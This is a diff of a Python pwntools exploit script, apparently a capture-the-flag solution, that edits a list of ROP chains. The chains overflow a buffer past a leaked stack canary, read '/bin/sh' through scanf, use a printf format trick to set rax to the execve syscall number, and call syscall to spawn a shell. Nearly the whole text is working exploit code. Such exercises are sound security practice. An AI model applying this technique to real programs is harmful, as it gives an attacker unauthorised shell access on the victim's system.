@@ -82,49 +82,50 @@ libc.srand(libc.time(0))
 canary = get_canary()
 # print(i, "Canary: ", hex(canary))
 test = []
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell , scanf,
+#                 rdi , specifier , rsi , dati , scanf,
+#                 rdi, dati, printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell , scanf,
+#                 rdi , specifier , rsi , dati , scanf, 
+#                 rdi, dati, adjust, printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding  , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell , scanf, 
+#                 rdi , specifier , rsi , dati , adjust, scanf,
+#                 rdi,  dati, printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell , scanf,
+#                 rdi , specifier , rsi , dati , adjust,scanf,
+#                 rdi, dati, adjust,printf, 
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell ,adjust , scanf,
+#                 rdi , specifier , rsi , dati , scanf,
+#                 rdi, dati, printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell , adjust,scanf,
+#                 rdi , specifier , rsi , dati , scanf,
+#                 rdi, dati, adjust,printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
+# test.append(flat(padding , p64(canary) , b"A" * 8 , 
+#                 rdi , specifier , rsi , shell ,adjust , scanf,
+#                 rdi , specifier , rsi , dati , adjust, scanf, 
+#                 rdi, dati, printf,
+#                 rdi,shell, rsi, 0, rdx, syscall))
 test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell , scanf,
-                rdi , specifier , rsi , dati , scanf,
-                rdi, dati, printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell , scanf,
-                rdi , specifier , rsi , dati , scanf, 
-                rdi, dati, adjust, printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding  , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell , scanf, 
-                rdi , specifier , rsi , dati , adjust, scanf,
-                rdi,  dati, printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell , scanf,
-                rdi , specifier , rsi , dati , adjust,scanf,
-                rdi, dati, adjust,printf, 
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell ,adjust , scanf,
-                rdi , specifier , rsi , dati , scanf,
-                rdi, dati, printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell , adjust,scanf,
-                rdi , specifier , rsi , dati , scanf,
-                rdi, dati, adjust,printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell ,adjust , scanf,
-                rdi , specifier , rsi , dati , adjust, scanf, 
-                rdi, dati, printf,
-                rdi,shell, rsi, 0, rdx, syscall))
-test.append(flat(padding , p64(canary) , b"A" * 8 , 
-                rdi , specifier , rsi , shell ,adjust , scanf, 
-                rdi , specifier , rsi , dati , adjust, scanf, 
-                rdi, dati, adjust ,printf,
-                rdi,shell, rsi, 0, rdx, syscall))
+                rdi , specifier , rsi , shell ,adjust , scanf, # scanf /bin/sh
+                rdi , specifier , rsi , dati , adjust, scanf, # scanf per rax
+                rdi, dati, adjust ,printf, # setto rax
+                rdi,shell, rsi, 0, rdx, syscall)) # system call
+
 
 # print(test[0])
-io.sendlineafter(b"> ", test[7])
+io.sendlineafter(b"> ", test[-1])
 io.sendline(b"/bin/sh")
 io.sendline(b"A%58c")
 
